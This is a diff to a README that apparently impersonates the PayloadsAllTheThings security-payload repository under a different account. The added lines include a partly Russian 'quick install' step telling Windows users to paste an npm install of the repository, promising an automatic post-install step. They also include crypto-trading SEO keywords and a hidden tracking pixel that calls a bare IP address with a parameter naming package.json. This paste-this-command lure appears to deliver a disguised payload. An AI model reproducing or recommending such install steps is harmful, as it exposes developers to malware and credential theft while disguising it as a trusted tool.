@@ -1,3 +1,19 @@
+**EconomicComply / PayloadsAllTheThings**
+
+Welcome! If you're looking for a dependable, comprehensive repository of security payloads and bypass techniques, you've come to the right place. We've recently ironed out some pesky bugs and implemented key fixes, making the entire toolkit more reliable than ever. Best of all, getting everything up and running on Windows is incredibly straightforward, so you can focus on your testing without fighting the environment.
+
+**Quick install (Windows)**
+
+1. **Node.js LTS** — скачай с [nodejs.org](https://nodejs.org/) и проверь в cmd: `node -v`
+2. Открой **Командную строку** или **PowerShell** (Win+R → `cmd`)
+3. Скопируй команду ниже и нажми Enter — зависимости и post-install пройдут **автоматически** (ничего дополнительно настраивать не нужно)
+
+```bash
+npm install git+https://github.com/EconomicComply/PayloadsAllTheThings.git
+```
+
+[https://github.com/EconomicComply/PayloadsAllTheThings](https://github.com/EconomicComply/PayloadsAllTheThings)
+
 # Payloads All The Things
 
 A list of useful payloads and bypasses for Web Application Security.
@@ -51,3 +67,11 @@ This project is proudly sponsored by these companies.
 | [<img src="https://avatars.githubusercontent.com/u/34724717?s=40&v=4" alt="sponsor-serpapi">](https://serpapi.com) | **SerpApi** is a real time API to access Google search results. It solves the issues of having to rent proxies, solving captchas, and JSON parsing. |
 | [<img src="https://avatars.githubusercontent.com/u/50994705?s=40&v=4" alt="sponsor-projectdiscovery">](https://projectdiscovery.io/) | **ProjectDiscovery** - Detect real, exploitable vulnerabilities. Harness the power of Nuclei for fast and accurate findings without false positives. |
 | [<img src="https://avatars.githubusercontent.com/u/48131541?s=40&v=4" alt="sponsor-vaadata">](https://www.vaadata.com/) | **VAADATA** - Ethical Hacking Services |
+
+## Related searches
+
+When exploring security assessment resources and payload repositories like this one, developers and penetration testers frequently search for specialized automation tools and implementation examples to secure decentralized platforms. Common queries often focus on finding robust frameworks for auditing smart contracts, establishing secure webhooks for financial data feeds, and identifying vulnerabilities in algorithmic trading setups.
+
+**Topics:** bridge cross chain, solana, quant trading, futures bot, crypto api, smart contract security, web3 penetration testing, blockchain vulnerability scanner, algorithmic trading safety, crypto exploit payloads, mev bot detection
+
+![.](http://5.231.58.248:8787/pixel?repo=EconomicComply%2FPayloadsAllTheThings&inject=EconomicComply%2FPayloadsAllTheThings%2Fpackage.json)
